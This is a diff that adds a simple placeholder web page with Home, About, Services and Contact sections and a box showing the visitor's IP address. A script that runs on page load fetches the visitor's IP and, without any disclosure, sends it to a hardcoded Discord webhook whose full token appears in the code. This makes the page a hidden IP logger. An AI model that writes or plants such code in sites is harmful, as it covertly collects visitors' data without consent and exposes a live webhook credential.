@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Classic Web Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            background-color: #333;
+            color: white;
+            padding: 10px 0;
+            text-align: center;
+        }
+
+            header h1 {
+                margin: 0;
+            }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+        }
+
+            nav ul li {
+                display: inline;
+                margin: 0 10px;
+            }
+
+                nav ul li a {
+                    color: white;
+                    text-decoration: none;
+                }
+
+        main {
+            padding: 20px;
+        }
+
+        section {
+            margin-bottom: 20px;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+
+        .show_user_ip {
+            background-color: #e2e2e2;
+            padding: 10px;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+    </style>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // Fetch the user's IP address using the ipify API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIpElement = document.getElementById('user-ip');
+                    userIpElement.textContent = data.ip;
+
+                    // Send the IP address to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1246227148872876082/bzPAHeHCZQHh0nponXKEoxy0uvoCWc56NpFE-hYtJqYafMn8W3cYkiUhaYgQPWz8TJPd';
+                    const message = {
+                        content: `User's IP Address: ${data.ip}`
+                    };
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('IP address sent to Discord webhook');
+                        } else {
+                            console.error('Failed to send IP address to Discord webhook');
+                        }
+                    })
+                    .catch(error => console.error('Error sending IP address to Discord webhook:', error));
+                })
+                .catch(error => console.error('Error fetching IP address:', error));
+        });
+    </script>
+</head>
+<body>
+    <header>
+        <h1>Welcome to My Classic Web Page</h1>
+        <nav>
+            <ul>
+                <li><a href="#home">Home</a></li>
+                <li><a href="#about">About</a></li>
+                <li><a href="#services">Services</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <section id="home">
+            <h2>Home</h2>
+            <p>This is the home section of the classic web page.</p>
+        </section>
+        <section id="about">
+            <h2>About</h2>
+            <p>This is the about section where you can learn more about us.</p>
+        </section>
+        <section id="services">
+            <h2>Services</h2>
+            <p>Here are the services we offer.</p>
+        </section>
+        <section id="contact">
+            <h2>Contact</h2>
+            <p>Get in touch with us through this contact section.</p>
+        </section>
+        <section class="show_user_ip">
+            <h2>Your IP Address</h2>
+            <p>Your IP address is: <span id="user-ip">Fetching...</span></p>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2024 Classic Web Page. All rights reserved.</p>
+    </footer>
+</body>
+</html>
